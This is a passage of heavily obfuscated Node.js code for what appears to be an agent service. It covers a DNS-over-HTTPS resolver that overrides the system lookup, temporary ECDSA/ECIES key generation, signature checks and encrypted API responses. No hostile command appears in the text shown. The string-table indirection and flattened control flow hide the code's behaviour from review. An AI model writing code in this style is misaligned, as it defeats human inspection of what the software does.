                'DezzD': dk(0x658),
                'XWYWj': dk(0x652)
            };
        if (!this[dk(0x79a)]) {
            const b = [];
            !this[dk(0x750)] && b[dk(0x1d5)](a[dk(0x870)]);
            !this[dk(0x5bf)] && b['push'](dk(0xc3a));
            if (a[dk(0x810)](b[dk(0x55c)], 0x0)) {
                const c = a[dk(0x610)][dk(0xb0c)]('|');
                let d = 0x0;
                while (!![]) {
                    switch (c[d++]) {
                    case '0':
                        a0P[dk(0xaa0)](a[dk(0x721)]);
                        continue;
                    case '1':
                        process[dk(0x744)](0x1);
                        continue;
                    case '2':
                        b['forEach'](f => a0P[dk(0xaa0)](dk(0xd04) + f));
                        continue;
                    case '3':
                        a0P[dk(0x3a5)](a[dk(0x49c)]);
                        continue;
                    case '4':
                        a0P[dk(0x3a5)](a[dk(0xa45)]);
                        continue;
                    case '5':
                        a0P[dk(0x3a5)](a[dk(0x79e)]);
                        continue;
                    }
                    break;
                }
            }
        }
    }
    static [a0cm(0x661)](a = {}) {
        const dl = a0cm, b = {
                'vtxMk': function (c, d) {
                    return c !== d;
                },
                'vKSZj': function (c, d) {
                    return c(d);
                },
                'XYlXL': function (c, d) {
                    return c !== d;
                },
                'FPKIN': function (c, d) {
                    return c(d);
                },
                'EUULQ': function (c, d) {
                    return c(d);
                },
                'MhdxI': function (c, d) {
                    return c(d);
                }
            };
        if (!a)
            return;
        a[dl(0x759)] !== undefined && b['vtxMk'](a['PORT'], null) && (this[dl(0x759)] = parseInt(b[dl(0xbef)](String, a['PORT']), 0xa));
        a[dl(0x750)] && (this[dl(0x750)] = a[dl(0x750)]['trim']());
        a['ECIES_PUBLIC_KEY_PEM'] && (this['ECIES_PUBLIC_KEY_PEM'] = a['ECIES_PUBLIC_KEY_PEM'][dl(0x58a)]());
        if (b[dl(0x12c)](a[dl(0xd88)], undefined) && a[dl(0xd88)] !== null) {
            const c = b['FPKIN'](String, a[dl(0xd88)])['trim']();
            if (/^(?:0|1|2|2q|2quic)$/i['test'](c)) {
                const d = c['toLowerCase']();
                this['KMODE'] = d[dl(0x830)]('2') ? '2' : d, this[dl(0x7d3)] = /^2q(?:uic)?$/[dl(0xdb7)](d);
            } else
                this[dl(0xd88)] = '0', this[dl(0x7d3)] = ![], a0P[dl(0x6df)](dl(0x7c6) + b[dl(0xbef)](String, a[dl(0xd88)]) + dl(0xc94));
        }
        a['KNAME'] && String(a[dl(0x583)])[dl(0x58a)]() && (this[dl(0x583)] = String(a[dl(0x583)])[dl(0x58a)]()), a[dl(0x62f)] && b[dl(0x966)](String, a['KNAME_KEY'])[dl(0x58a)]() && (this[dl(0x62f)] = b[dl(0xbef)](String, a[dl(0x62f)])['trim']()), a[dl(0xa3e)] && b[dl(0x944)](String, a[dl(0xa3e)])[dl(0x58a)]() && (this['KPATH'] = b[dl(0x1f9)](String, a[dl(0xa3e)])['trim']());
    }
}
const a0a2 = require(a0cm(0xbad)), a0a3 = require(a0cm(0x402));
class a0a4 {
    static ['TTL_MIN'] = 0x1e;
    static ['TTL_MAX'] = 0x258;
    static [a0cm(0xa25)] = 0x3c;
    static ['SERVER_BACKOFF'] = 0x3c;
    static [a0cm(0xd1a)] = 0x12c;
    static [a0cm(0x43d)];
    static [a0cm(0x3f1)] = null;
    constructor(a = {}) {
        const dm = a0cm, b = (a[dm(0xbec)] && a[dm(0xbec)][dm(0x55c)] ? a[dm(0xbec)] : a0a1[dm(0xa12)])[dm(0x8a0)](c => String(c)[dm(0x58a)]()[dm(0x3a0)](/\/+$/, ''))[dm(0x88f)](Boolean);
        this['servers'] = b['length'] ? b : [...a0a1[dm(0xa12)]], this[dm(0x6ce)] = a[dm(0x6ce)] || 0xbb8, this[dm(0x39c)] = a[dm(0x39c)] || ((c, d, f) => this[dm(0x1ea)](c, d, f)), this['cache'] = new Map(), this[dm(0xa8c)] = new Map(), this[dm(0x5f1)] = this['servers'][dm(0x8a0)](() => 0x0), this[dm(0x96c)] = 0x0;
    }
    async [a0cm(0x48d)](a, b) {
        const dn = a0cm, c = {
                'BvFSj': function (j, k) {
                    return j === k;
                },
                'gjjKg': function (j, k) {
                    return j * k;
                },
                'cakyw': function (j, k) {
                    return j === k;
                },
                'WmsHd': dn(0x892),
                'sufYK': function (j, k) {
                    return j + k;
                },
                'FsCnY': function (j, k) {
                    return j || k;
                },
                'HaQGv': function (j, k) {
                    return j > k;
                }
            };
        b = c[dn(0x80a)](b, 0x0);
        const d = a + '|' + b, f = Date['now'](), g = this[dn(0xa09)]['get'](d);
        if (g && c[dn(0x186)](g[dn(0xd59)], f))
            return g[dn(0x52f)]['slice']();
        const h = this[dn(0xa8c)][dn(0x81a)](d);
        if (h)
            return h;
        const i = ((async () => {
            const dp = dn, j = await this['queryAll'](a, b);
            if (c['BvFSj'](j['status'], 'ok') && j[dp(0x52f)][dp(0x55c)]) {
                const k = c[dp(0xd73)](Math['min'](Math['max'](j[dp(0xd13)], a0a4[dp(0xbb5)]), a0a4[dp(0xe6)]), 0x3e8);
                return this[dp(0xa09)]['set'](d, {
                    'ips': j['ips']['slice'](),
                    'expire': Date[dp(0x866)]() + k
                }), j[dp(0x52f)][dp(0x2d5)]();
            }
            if (c['cakyw'](j[dp(0xaa2)], c['WmsHd']))
                return this[dp(0xa09)]['set'](d, {
                    'ips': [],
                    'expire': c[dp(0x7cd)](Date['now'](), a0a4['NEGATIVE_TTL'] * 0x3e8)
                }), [];
            return null;
        })());
        this[dn(0xa8c)][dn(0x689)](d, i);
        try {
            return await i;
        } finally {
            this[dn(0xa8c)]['delete'](d);
        }
    }
    async ['queryAll'](a, b) {
        const dq = a0cm, c = {
                'VzWhZ': function (k, l) {
                    return k !== l;
                },
                'AEitw': dq(0x892),
                'YmCZL': dq(0xaa0)
            }, d = [];
        if (c[dq(0x632)](b, 0x6))
            d[dq(0x1d5)]([
                0x1,
                0x4
            ]);
        if (c[dq(0x632)](b, 0x4))
            d['push']([
                0x1c,
                0x6
            ]);
        const f = {
            0x4: [],
            0x6: []
        };
        let g = ![], h = ![], i = ![], j = a0a4[dq(0xe6)];
        for (const [k, l] of d) {
            try {
                const m = await this[dq(0xbc7)](a, k);
                m['status'] === 'ok' && m[dq(0x52f)]['length'] ? (g = !![], f[l] = m[dq(0x52f)], j = Math[dq(0x389)](j, m[dq(0xd13)])) : h = !![];
            } catch (n) {
                i = !![];
            }
        }
        if (g)
            return {
                'status': 'ok',
                'ips': this[dq(0xa4a)](f[0x6], f[0x4]),
                'ttl': j
            };
        if (h && !i)
            return {
                'status': c['AEitw'],
                'ips': [],
                'ttl': 0x0
            };
        return {
            'status': c['YmCZL'],
            'ips': [],
            'ttl': 0x0
        };
    }
    async [a0cm(0xbc7)](a, b) {
        const dr = a0cm, c = {
                'acmQm': function (f, g) {
                    return f < g;
                },
                'Jrqme': function (f, g) {
                    return f + g;
                },
                'VtwGN': function (f, g) {
                    return f * g;
                },
                'ICUUm': function (f, g) {
                    return f === g;
                },
                'vWUZM': function (f, g) {
                    return f === g;
                },
                'nnAeO': dr(0x892),
                'SVFKH': function (f, g) {
                    return f !== g;
                }
            }, d = a0a4[dr(0x100)](a);
        for (let f = 0x0; c[dr(0x7ac)](f, this[dr(0xbec)]['length']); f++) {
            if (c['acmQm'](Date[dr(0x866)](), this['failUntil'][f]))
                continue;
            let g;
            try {
                g = await this['queryFn'](this[dr(0xbec)][f], d, b);
            } catch (l) {
                this[dr(0x5f1)][f] = c[dr(0x16f)](Date[dr(0x866)](), c['VtwGN'](a0a4[dr(0x545)], 0x3e8));
                continue;
            }
            const h = g && c[dr(0xb61)](typeof g, dr(0x66d)) ? g[dr(0x2f5)] || 0x0 : 0x1;
            if (c[dr(0x1a3)](h, 0x3))
                return {
                    'status': c['nnAeO'],
                    'ips': [],
                    'ttl': 0x0
                };
            if (c['SVFKH'](h, 0x0))
                continue;
            const j = [];
            let k = a0a4['TTL_MAX'];
            for (const m of g[dr(0x369)] || []) {
                if (!m || c['SVFKH'](m[dr(0x483)], b))
                    continue;
                if (c[dr(0x294)](typeof m[dr(0x5f8)], dr(0x12a)) || !a0a4[dr(0x92c)](m['data'], b))
                    continue;
                j[dr(0x1d5)](m[dr(0x5f8)]);
                const n = parseInt(m[dr(0x26c)], 0xa);
                if (Number[dr(0x7ab)](n))
                    k = Math[dr(0x389)](k, n);
            }
            if (j[dr(0x55c)])
                return {
                    'status': 'ok',
                    'ips': [...new Set(j)],
                    'ttl': k
                };
            return {
                'status': c['nnAeO'],
                'ips': [],
                'ttl': 0x0
            };
        }
        throw new Error(dr(0xb6f));
    }
    ['dohQuery'](a, b, c) {
        const ds = a0cm, d = {
                'QKkeb': function (f, g) {
                    return f !== g;
                },
                'uRYos': function (f, g) {
                    return f(g);
                },
                'cjfxY': ds(0x5f8),
                'eIjfz': ds(0x536),
                'VMhBw': ds(0x7d9),
                'tgKUk': function (f, g) {
                    return f(g);
                },
                'Stwik': ds(0x8da),
                'EboFt': ds(0x563),
                'dbBkE': 'error'
            };
        return new Promise((f, g) => {
            const dt = ds, h = {
                    'vzjyZ': d[dt(0x815)],
                    'LiloM': function (j, k) {
                        const du = dt;
                        return d[du(0xbb3)](j, k);
                    }
                }, i = a0h[dt(0x16e)](a + '?name=' + encodeURIComponent(b) + '&type=' + c, {
                    'method': dt(0x226),
                    'timeout': this[dt(0x6ce)],
                    'headers': {
                        'accept': d[dt(0x2b0)],
                        'user-agent': dt(0x3c5) + a0a1['AGENT_VERSION']
                    }
                }, j => {
                    const dv = dt;
                    if (d[dv(0x7f5)](j[dv(0x16d)], 0xc8)) {
                        j[dv(0x1cf)](), d['uRYos'](g, new Error(dv(0xbcd) + j[dv(0x16d)]));
                        return;
                    }
                    const k = [];
                    j['on'](d[dv(0x873)], l => k[dv(0x1d5)](l)), j['on'](d[dv(0x2dd)], () => {
                        const dw = dv;
                        try {
                            f(JSON[dw(0x881)](Buffer[dw(0x5f9)](k)['toString'](h['vzjyZ'])));
                        } catch (l) {
                            h['LiloM'](g, l);
                        }
                    });
                });
            i['on'](d['EboFt'], () => i['destroy'](new Error(dt(0x673)))), i['on'](d[dt(0x5fe)], g), i[dt(0x536)]();
        });
    }
    [a0cm(0x616)](a) {
        const dx = a0cm, b = {
                'sNJVy': function (d, f) {
                    return d >= f;
                },
                'bJvUB': function (d, f) {
                    return d - f;
                }
            }, c = Date[dx(0x866)]();
        b[dx(0x14e)](b[dx(0x5b3)](c, this['lastFallbackWarn']), a0a4[dx(0xd1a)] * 0x3e8) && (this[dx(0x96c)] = c, a0P[dx(0x6df)](dx(0x844) + a + dx(0xbcb)));
    }
    [a0cm(0xa4a)](a, b) {
        const dy = a0cm, c = [...new Set(a)], d = [...new Set(b)];
        if (!c[dy(0x55c)])
            return d;
        if (!d[dy(0x55c)])
            return c;
        return this[dy(0x572)]() ? c[dy(0x5f9)](d) : d[dy(0x5f9)](c);
    }
    [a0cm(0x572)]() {
        const dz = a0cm, a = {
                'dpqdd': function (b, c) {
                    return b === c;
                },
                'PqnDf': dz(0xdae)
            };
        if (a['dpqdd'](a0a4[dz(0x43d)], undefined))
            try {
                const b = a0a3['createSocket'](a[dz(0x191)]);
                b['close'](), a0a4[dz(0x43d)] = !![];
            } catch (c) {
                a0a4[dz(0x43d)] = ![];
            }
        return a0a4[dz(0x43d)];
    }
    static [a0cm(0x92c)](a, b) {
        const dA = a0cm, c = {
                'OWXKo': function (d, f) {
                    return d === f;
                }
            };
        return a0i[dA(0x407)](a) === (c[dA(0x233)](b, 0x1) ? 0x4 : 0x6);
    }
    static [a0cm(0x100)](a) {
        const dB = a0cm;
        if (/^[\x00-\x7F]*$/[dB(0xdb7)](a))
            return a;
        try {
            return new URL('http://' + a)[dB(0xc18)];
        } catch (b) {
            return a;
        }
    }
}
const a0a5 = a0a2['lookup'];
function a0a6(a, b) {
    const dC = a0cm, c = {
            'rQopt': function (f, g) {
                return f === g;
            },
            'AMfiP': dC(0x447),
            'jCQgU': function (f, g, h) {
                return f(g, h);
            },
            'yDUcv': function (f, g, h, i) {
                return f(g, h, i);
            },
            'DydcR': function (f, g) {
                return f === g;
            },
            'qUBUr': function (f, g) {
                return f !== g;
            },
            'jDDIC': dC(0x12a),
            'xNPza': function (f, g) {
                return f === g;
            },
            'uDllt': function (f, g) {
                return f || g;
            },
            'TymOm': dC(0x3ca),
            'YEkrD': function (f, g) {
                return f === g;
            },
            'yVock': 'ipv4',
            'udTDK': function (f, g) {
                return f === g;
            },
            'FsLzW': dC(0x3cd),
            'ubBju': dC(0x37f),
            'SUmxK': function (f, g) {
                return f !== g;
            },
            'EGZBe': dC(0x6a7),
            'EnFAE': function (f, g) {
                return f === g;
            },
            'uMFqA': dC(0x66d)
        }, d = b || a0a5;
    return function f(g, h, i) {
        const dD = dC;
        c['DydcR'](typeof h, dD(0x13e)) && (i = h, h = {});
        if (c[dD(0x203)](typeof g, c[dD(0x487)]) || !g || a0i['isIP'](g))
            return d[dD(0xb10)](a0a2, g, h, i);
        const j = h || {};
        let k = c['xNPza'](typeof j, dD(0x66d)) ? j[dD(0xd4d)] || 0x0 : c[dD(0x4eb)](j, 0x0);
        if (c['DydcR'](k, c[dD(0x5b1)]) || c[dD(0x224)](k, c[dD(0xb96)]))
            k = 0x4;
        else {
            if (c[dD(0x9aa)](k, c['FsLzW']) || c[dD(0x466)](k, c[dD(0x4bb)]))
                k = 0x6;
            else {
                if (c['SUmxK'](typeof k, c[dD(0x6bd)]))
                    k = 0x0;
            }
        }
        const l = c['EnFAE'](typeof j, c[dD(0x998)]) && !!j[dD(0x479)];
        a[dD(0x48d)](g, k)['then'](m => {
            const dE = dD;
            if (c[dE(0x335)](m, null))
                return a['warnFallback'](g), d[dE(0xb10)](a0a2, g, h, i);
            if (!m[dE(0x55c)]) {
                const n = new Error(dE(0xc44) + g + dE(0xbf7));
                return n[dE(0xa2f)] = c[dE(0x9b8)], n['syscall'] = dE(0x7d4), n[dE(0xc18)] = g, i(n);
            }
            l ? c['jCQgU'](i, null, m[dE(0x8a0)](o => ({
                'address': o,
                'family': a0i[dE(0x407)](o)
            }))) : c['yDUcv'](i, null, m[0x0], a0i[dE(0x407)](m[0x0]));
        })[dD(0xd7b)](m => i(m || new Error(dD(0x523))));
    };
}
function a0a7(a = null) {
    const dF = a0cm, b = {
            'PfpaY': function (f, g) {
                return f(g);
            },
            'netVI': function (f, g) {
                return f !== g;
            },
            'TILRE': function (f, g, h) {
                return f(g, h);
            }
        };
    if (a0a4[dF(0x3f1)])
        return a0a4[dF(0x3f1)];
    const c = b[dF(0x809)](String, a === null ? a0a1[dF(0x503)] : a)[dF(0x58a)]()[dF(0x426)]();
    if (b[dF(0x723)](c, 'on'))
        return null;
    let d = null;
    return a0a1['DOH_SERVERS'] && (d = a0a1[dF(0xb99)][dF(0xb0c)](/[,\s]+/)[dF(0x8a0)](f => f[dF(0x58a)]())[dF(0x88f)](Boolean)), a0a4[dF(0x3f1)] = new a0a4({ 'servers': d }), a0a2[dF(0x84f)] = b[dF(0x7ae)](a0a6, a0a4[dF(0x3f1)], a0a5), a0P[dF(0xd42)](dF(0x574) + a0a4[dF(0x3f1)][dF(0xbec)]['join'](',\x20')), a0a4[dF(0x3f1)];
}
a0a7();
class a0a8 {
    constructor() {
        const dG = a0cm;
        this[dG(0x9dc)] = null, this['onExpired'] = null;
    }
    [a0cm(0x471)](a) {
        const dH = a0cm, b = {
                'XlnRc': function (c, d) {
                    return c * d;
                },
                'shxnc': dH(0x13e)
            };
        this[dH(0x93c)]();
        if (this[dH(0x9dc)]) {
            if (this[dH(0x9dc)][dH(0x951)] === b[dH(0x926)](a, 0xe10))
                return this[dH(0x9dc)];
            const c = this[dH(0x9dc)]['key_id'];
            this['_key'] = null, a0P['warn']('🔄\x20[TempKey]\x20请求\x20ttl\x20变更,\x20旧临时密钥提前作废:\x20key_id=' + c);
            if (typeof this[dH(0x921)] === b[dH(0x736)])
                try {
                    this[dH(0x921)]();
                } catch (d) {
                    a0P[dH(0xaa0)](dH(0x27e) + d[dH(0xbe8)]);
                }
        }
        return this[dH(0x9dc)] = this[dH(0x9ee)](a), a0P[dH(0xd42)](dH(0xcaa) + this[dH(0x9dc)][dH(0xc26)] + ',\x20有效期\x20' + a + dH(0x14c)), this['_key'];
    }
    [a0cm(0x701)]() {
        const dI = a0cm;
        this[dI(0x93c)]();
        if (this[dI(0x9dc)])
            return this[dI(0x9dc)]['ecdsa_vk'];
        return null;
    }
    ['getActiveEciesPub']() {
        const dJ = a0cm;
        this[dJ(0x93c)]();
        if (this[dJ(0x9dc)])
            return this[dJ(0x9dc)][dJ(0xaa5)];
        return null;
    }
    [a0cm(0x93c)]() {
        const dK = a0cm, a = {
                'jMwnu': function (b, c) {
                    return b === c;
                }
            };
        if (this[dK(0x9dc)] && this[dK(0x2d3)](this[dK(0x9dc)])) {
            const b = this[dK(0x9dc)][dK(0xc26)];
            this[dK(0x9dc)] = null, a0P['warn']('🔄\x20[TempKey]\x20临时密钥已过期:\x20key_id=' + b);
            if (a[dK(0x687)](typeof this[dK(0x921)], 'function'))
                try {
                    this[dK(0x921)]();
                } catch (c) {
                    a0P['error'](dK(0x9e2) + c[dK(0xbe8)]);
                }
        }
    }
    ['_isExpired'](a) {
        const dL = a0cm, b = {
                'ObqPg': function (c, d) {
                    return c >= d;
                },
                'cjnFJ': function (c, d) {
                    return c / d;
                }
            };
        return b['ObqPg'](Math['floor'](b['cjnFJ'](Date[dL(0x866)](), 0x3e8)), a[dL(0x6ef)]);
    }
    [a0cm(0x9ee)](a) {
        const dM = a0cm, b = {
                'wgWqm': 'prime256v1',
                'gjpiD': dM(0x227),
                'RWTde': dM(0x728),
                'mHsxC': dM(0x146),
                'wCpgO': dM(0x3da),
                'pPfBS': function (o, p) {
                    return o - p;
                },
                'utNoG': 'hex',
                'Vcizy': function (o, p) {
                    return o + p;
                },
                'crUar': dM(0x93b),
                'MplhH': dM(0x5bd)
            }, {
                privateKey: c,
                publicKey: d
            } = a0k['generateKeyPairSync']('ec', { 'namedCurve': b['wgWqm'] }), f = c[dM(0x82a)]({
                'type': b['gjpiD'],
                'format': b['RWTde']
            }), g = d[dM(0x82a)]({
                'type': b['mHsxC'],
                'format': b['RWTde']
            }), h = a0k['randomBytes'](0x20), i = Buffer['from'](a0B[dM(0x36a)](h, ![])), j = c['export']({ 'format': dM(0xbf0) }), k = d['export']({
                'type': b['mHsxC'],
                'format': b[dM(0x20c)]
            }), l = k['subarray'](b[dM(0x375)](k[dM(0x55c)], 0x41)), m = Math['floor'](Date[dM(0x866)]() / 0x3e8), n = a * 0xe10;
        return {
            'key_id': a0k['randomBytes'](0x8)[dM(0x7a0)](b[dM(0x34e)]),
            'created_at': m,
            'expires_at': b[dM(0x3d4)](m, n),
            'ttl_seconds': n,
            'ecdsa_private_key': f,
            'ecdsa_public_key': g,
            'ecies_private_key': h[dM(0x7a0)](b['utNoG']),
            'ecies_public_key': i[dM(0x7a0)](dM(0x47c)),
            'ecdsa_private_hex': Buffer[dM(0x1e7)](j['d'], b[dM(0xab8)])['toString'](b[dM(0x34e)]),
            'ecdsa_public_b64': Buffer[dM(0x1e7)](a0A[dM(0xa7b)][dM(0x4fe)](l)[dM(0xbe6)](!![]))[dM(0x7a0)](b[dM(0x222)]),
            'ecies_public_b64': Buffer[dM(0x1e7)](a0B[dM(0x36a)](h, !![]))[dM(0x7a0)](b['MplhH']),
            'ecdsa_vk': d,
            'ecies_pub': i
        };
    }
}
class a0a9 {
    constructor(a, b) {
        const dN = a0cm, c = {
                'hxFfy': dN(0xc00),
                'DOimw': dN(0x5bd),
                'DXYnm': function (d, f) {
                    return d(f);
                },
                'nsbPV': dN(0x3b7),
                'JdjtF': dN(0xbf0)
            };
        this[dN(0xae4)] = null, this['eciesPubkey'] = null;
        if (a)
            try {
                const d = a[dN(0x58a)]();
                if (d[dN(0x830)](c[dN(0x163)]))
                    this[dN(0xae4)] = a0k[dN(0x70a)](d);
                else {
                    const f = Buffer[dN(0x1e7)](d, c[dN(0x365)]), g = a0A[dN(0xa7b)][dN(0x4fe)](f), h = g[dN(0xbe6)](![]), i = m => m['toString']('base64')[dN(0x3a0)](/\+/g, '-')[dN(0x3a0)](/\//g, '_')['replace'](/=/g, ''), j = c[dN(0x3eb)](i, Buffer[dN(0x1e7)](h['slice'](0x1, 0x21))), k = c[dN(0x3eb)](i, Buffer[dN(0x1e7)](h[dN(0x2d5)](0x21, 0x41))), l = {
                            'kty': 'EC',
                            'crv': c[dN(0x2b6)],
                            'x': j,
                            'y': k
                        };
                    this[dN(0xae4)] = a0k[dN(0x70a)]({
                        'key': l,
                        'format': c[dN(0x692)]
                    });
                }
            } catch (m) {
                a0P[dN(0xaa0)]('⚠️\x20ECDSA公钥加载失败:\x20' + m[dN(0xbe8)]), this[dN(0xae4)] = null;
            }
        if (b)
            try {
                this[dN(0x8f7)] = a0w[dN(0x9ec)](b[dN(0x58a)]());
            } catch (n) {
                a0P[dN(0x6df)]('⚠️\x20ECIES公钥解码失败:\x20' + n[dN(0xbe8)]);
            }
    }
    [a0cm(0xb51)](a, b, c, d, f, g, h = null) {
        const dO = a0cm, i = {
                'Fcgdh': dO(0x7e8),
                'GIjVH': function (j, k) {
                    return j(k);
                },
                'lytHa': function (j, k) {
                    return j / k;
                },
                'jOWfE': function (j, k) {
                    return j > k;
                },
                'zwPOx': function (j, k) {
                    return j - k;
                },
                'yHskg': function (j, k, l, m, n, o) {
                    return j(k, l, m, n, o);
                },
                'KKHXU': dO(0x354),
                'ZuOmn': 'temp',
                'uTIcx': dO(0xc3e)
            };
        if (!this[dO(0xae4)])
            throw new Error(i[dO(0x622)]);
        try {
            const j = i['GIjVH'](parseInt, f), k = Math[dO(0x19a)](i[dO(0x22a)](Date[dO(0x866)](), 0x3e8));
            if (i[dO(0x441)](Math['abs'](k - j), a0a1[dO(0x3e0)]))
                throw new Error(dO(0xd32) + Math[dO(0x6d9)](i[dO(0x9d1)](k, j)) + dO(0x21d) + a0a1[dO(0x3e0)] + 's');
            const l = i[dO(0xc5f)](a0aa, a, b, c, d, f);
            if (this[dO(0x918)](this['ecdsaPubkey'], l, g))
                return i['KKHXU'];
            if (h && this[dO(0x918)](h, l, g))
                return i['ZuOmn'];
            throw new Error(i[dO(0x654)]);
        } catch (m) {
            throw new Error('Signature\x20verification\x20failed:\x20' + m['message']);
        }
    }
    [a0cm(0x918)](a, b, c) {
        const dP = a0cm, d = { 'nkvCM': dP(0x7b1) };
        if (!a)
            return ![];
        try {
            const f = a0w[dP(0x9ec)](c), g = a0k[dP(0x6d5)](d[dP(0x788)]);
            return g[dP(0x442)](b), g[dP(0x6a9)](a, f);
        } catch (h) {
            return ![];
        }
    }
    [a0cm(0x8df)](a, b = null) {
        const dQ = a0cm, c = {
                'OxufR': dQ(0x1a0),
                'tXhlq': dQ(0x497),
                'uILzk': dQ(0x5bd)
            };
        if (a0a1[dQ(0x79a)])
            return JSON[dQ(0xd94)](a);
        if (!this['eciesPubkey'])
            throw new Error(c[dQ(0x422)]);
        try {
            const d = JSON[dQ(0xd94)](a), f = Buffer[dQ(0x1e7)](d, c['tXhlq']), g = b || Buffer['from'](this[dQ(0x8f7)]), h = a0v(g, f);
            return Buffer[dQ(0x1e7)](h)[dQ(0x7a0)](c[dQ(0x64a)]);
        } catch (i) {
            throw new Error(dQ(0xba9) + i[dQ(0xbe8)]);
        }
    }
    ['decryptData'](a, b) {
        const dR = a0cm, c = {
                'cFcbJ': dR(0xb84),
                'fEKvk': dR(0x7d9),
                'HOqhn': 'base64',
                'WTenC': dR(0x941)
            };
        if (!b || b[dR(0x55c)] !== 0x20)
            throw new Error(c['cFcbJ']);
        try {
            const d = Buffer['from'](a, dR(0x5bd))[dR(0x7a0)](c['fEKvk']), f = JSON['parse'](d);
            if (!f[dR(0x977)] || !f[dR(0x600)] || !f['ciphertext'])
                throw new Error(dR(0x292));
            const g = Buffer[dR(0x1e7)](f[dR(0x977)], c['HOqhn']), h = Buffer['from'](f[dR(0x600)], c[dR(0xd0b)]), i = Buffer['from'](f[dR(0x317)], c[dR(0xd0b)]), j = a0k[dR(0x2f0)](c[dR(0xb01)], b, g);
            j[dR(0xbf9)](h);
            let k = j[dR(0x442)](i, null, dR(0x7d9));
            return k += j['final'](dR(0x7d9)), k;
        } catch (l) {
            throw new Error(dR(0x939) + l['message']);
        }
    }
    [a0cm(0xabe)](a, b) {
        const dS = a0cm, c = {
                'WnCQL': dS(0x941),
                'RDVBm': dS(0x5bd),
                'fwoZa': dS(0x7d9)
            };
        if (!b || b[dS(0x55c)] !== 0x20)
            throw new Error(dS(0x84d));
        try {
            const d = a0k[dS(0x395)](0xc), f = a0k[dS(0x925)](c[dS(0xcfa)], b, d), g = Buffer[dS(0x5f9)]([
                    f[dS(0x442)](a),
                    f[dS(0x890)]()
                ]), h = f[dS(0x69c)](), i = {
                    'nonce': d[dS(0x7a0)](c[dS(0x9b6)]),
                    'tag': h[dS(0x7a0)](dS(0x5bd)),
                    'ciphertext': g[dS(0x7a0)](c['RDVBm'])
                };
            return Buffer[dS(0x1e7)](JSON[dS(0xd94)](i), c[dS(0xc84)])[dS(0x7a0)](c[dS(0x9b6)]);
        } catch (j) {
            throw new Error(dS(0x2b3) + j[dS(0xbe8)]);
        }
    }
}
function a0aa(a, b, c, d, f) {
    const dT = a0cm, g = {
            'EDvQc': dT(0x5bc),
            'RABSI': 'hex'
        };
    return !c && (c = a0k[dT(0xb07)](g[dT(0xdab)])[dT(0x442)](Buffer[dT(0x2d9)](0x0))['digest'](g[dT(0x429)])), a + '\x0a' + b + '\x0a' + c + '\x0a' + d + '\x0a' + f;
}
function a0ab(a, b = null) {
    const dU = a0cm, c = {
            'LOTGe': function (d, f) {
                return d === f;
            },
            'EhOvG': 'string',
            'lcunL': 'x-encrypted',
            'TisEg': dU(0x99a),
            'pMynV': dU(0xb6e),
            'BhJts': dU(0x74e),
            'swqtY': 'application/json',
            'xeiQJ': dU(0xc55),
            'VUFsh': dU(0x5bd),
            'HUGvN': dU(0x7d9),
            'ykTjR': '/api/ws/',
            'sisZe': function (d) {
                return d();
            },
            'EjHBv': function (d, f) {
                return d === f;
            },
            'XGOym': dU(0xabd),
            'VZnvM': dU(0x8d3),
            'qXyPt': '/api/status',
            'mzsOS': 'x-nonce',
            'SRNNk': dU(0xd95),
            'gdACv': dU(0xa17),
            'ozghY': dU(0x726),
            'PPdWI': function (d) {
                return d();
            },
            'yfNVW': dU(0xb7b),
            'vdfXf': function (d, f) {
                return d === f;
            },
            'vhWmq': function (d, f) {
                return d > f;
            },
            'bDODa': dU(0x5bc),
            'ljdiL': dU(0x47c),
            'RspRE': function (d, f) {
                return d === f;
            },
            'WLxzq': dU(0x712),
            'odjKU': dU(0x354),
            'MYAWo': function (d) {
                return d();
            },
            'hmyiH': function (d, f) {
                return d === f;
            },
            'wChvJ': function (d, f) {
                return d === f;
            },
            'qTZDH': dU(0xb3f),
            'bMjdW': dU(0x9ac),
            'nLwiT': dU(0x9d0),
            'ljFCc': dU(0x497),
            'xbkdT': function (d, f) {
                return d === f;
            }
        };
    return async (d, f, g) => {
        const dV = dU;
        if (d['path'][dV(0x830)](c[dV(0x2fa)]))
            return c[dV(0x291)](g);
        const h = f[dV(0x77d)];
        f[dV(0x77d)] = function (n) {
            const dW = dV;
            if (a0a1[dW(0x79a)]) {
                const o = c['LOTGe'](typeof n, c[dW(0x9e7)]) ? n : Buffer[dW(0x45a)](n) ? n : JSON[dW(0xd94)](n);
                return f['set'](c[dW(0x158)], c[dW(0x164)]), f[dW(0x689)](c['pMynV'], Buffer[dW(0x95e)](o)[dW(0x7a0)]()), h[dW(0xb10)](this, o);
            }
            if (f[dW(0x81a)](c[dW(0xa11)]) && f[dW(0x81a)](c[dW(0xa11)])[dW(0x134)](c[dW(0x6c4)]))
                try {
                    if (d[dW(0xaa6)]) {
                        let p;
                        if (c[dW(0x614)](d[dW(0xa3d)], c['xeiQJ'])) {
                            const q = typeof n === dW(0x12a) ? JSON[dW(0x881)](n) : n;
                            let r = null;
                            c[dW(0x614)](d['key_source'], dW(0x712)) && b && (r = b['getActiveEciesPub']());
                            const s = a[dW(0x8df)](q, r);
                            p = c[dW(0x614)](typeof s, dW(0x12a)) ? s : JSON['stringify'](s);
                        } else {
                            const t = Buffer[dW(0x45a)](n) ? n : typeof n === dW(0x12a) ? Buffer[dW(0x1e7)](n, dW(0x7d9)) : Buffer[dW(0x1e7)](JSON[dW(0xd94)](n), dW(0x7d9));
                            p = a[dW(0xabe)](t, Buffer[dW(0x1e7)](a0a1[dW(0x238)], c['VUFsh']));
                        }
                        return f[dW(0x689)](c[dW(0x158)], dW(0x9ac)), f[dW(0x689)]('x-agent-version', a0a1[dW(0x67d)]), f['set'](c['pMynV'], Buffer[dW(0x95e)](p, dW(0x7d9))[dW(0x7a0)]()), h[dW(0xb10)](this, p);
                    } else {
                        const u = c['LOTGe'](typeof n, c[dW(0x9e7)]) ? n : JSON['stringify'](n);
                        return f[dW(0x689)](dW(0xb6e), Buffer[dW(0x95e)](u, c[dW(0xadd)])[dW(0x7a0)]()), h[dW(0xb10)](this, u);
                    }
                } catch (v) {
                    if (!f[dW(0xaaa)]) {
                        const w = JSON[dW(0xd94)]({ 'error': 'Response\x20encryption\x20failed:\x20' + v[dW(0xbe8)] });
                        return f[dW(0xaa2)](0x1f4), f[dW(0x689)](dW(0x74e), c[dW(0x6c4)]), f[dW(0x689)]('Content-Length', Buffer[dW(0x95e)](w, c['HUGvN'])[dW(0x7a0)]()), h[dW(0xb10)](this, w);
                    }
                    throw v;
                }
            return h['call'](this, n);
        };
        const i = f[dV(0x536)];
        f[dV(0x536)] = function (...n) {
            const dX = dV;
